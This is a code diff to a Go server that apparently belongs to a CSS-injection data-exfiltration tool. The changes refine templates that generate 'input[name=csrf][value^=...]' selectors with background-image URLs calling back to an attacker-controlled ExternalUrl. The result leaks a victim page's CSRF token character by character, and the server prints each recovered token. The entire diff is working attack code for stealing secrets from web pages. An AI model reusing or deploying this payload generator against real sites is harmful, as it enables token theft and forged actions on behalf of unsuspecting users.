@@ -42,11 +42,11 @@ func Waiting(cfg *Config) http.Handler {
 func Callback(cfg *Config) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		partialToken := r.URL.Query()["token"][0]
-		lenPartial := len(partialToken)
+		lenPartial := len(partialToken) - len(cfg.Prefix)
 		if partialToken == "" {
 			fmt.Println("failed to retrieve 'token' parameter")
 		} else if lenPartial == cfg.Length {
-			fmt.Println("🥜🌰 Here is your nuts:", color.Green(partialToken))
+			fmt.Println("🥜🌰 Here is your nuts:", color.Red(partialToken))
 			w.Write([]byte("OK"))
 		} else {
 			fmt.Println("🍃 retrieve data...", color.Cyan(partialToken))
@@ -70,9 +70,9 @@ func InitTemplates(cfg *Config) {
 	cfg.ImportTemplate = "{{range $val := .}}\n" + importTpl.String() + "/waiting?len={{$val}}\");{{end}}"
 	//"background" template
 	var backTpl bytes.Buffer
-	tBack := template.Must(template.New("trialAndError").Parse(`}}] { background: url({{ .ExternalUrl}}/callback?token=`))
+	tBack := template.Must(template.New("trialAndError").Parse(`}}"] { background: url({{ .ExternalUrl}}/callback?token=`))
 	tBack.Execute(&backTpl, data)
-	cfg.BackgroundTemplate = "{{range $val := .}}\ninput[name=csrf][value^={{$val" + backTpl.String() + "{{$val}}); }{{end}}"
+	cfg.BackgroundTemplate = "{{range $val := .}}\ninput[name=csrf][value^=\"{{$val" + backTpl.String() + "{{$val}}); }{{end}}"
 }
 
 func craftImports(tpl string, len int) (result string, err error) {
@@ -104,7 +104,7 @@ func sendImports(w http.ResponseWriter, tpl string, len int) {
 func sendBackgroundPayload(w http.ResponseWriter, partial string, cfg Config) {
 	// for j in range charset
 	//     response css with background loading at url/callback?token=channel[i]+charset[j]
-	payload, err := craftBackgroundPayload(cfg.BackgroundTemplate, partial, strings.Split(cfg.Charset, ""))
+	payload, err := craftBackgroundPayload(cfg.BackgroundTemplate, cfg.Prefix+partial, strings.Split(cfg.Charset, ""))
 	if err != nil {
 		fmt.Println("failed crafting background payload:", err)
 		w.Write([]byte("OK")) // answer anyway
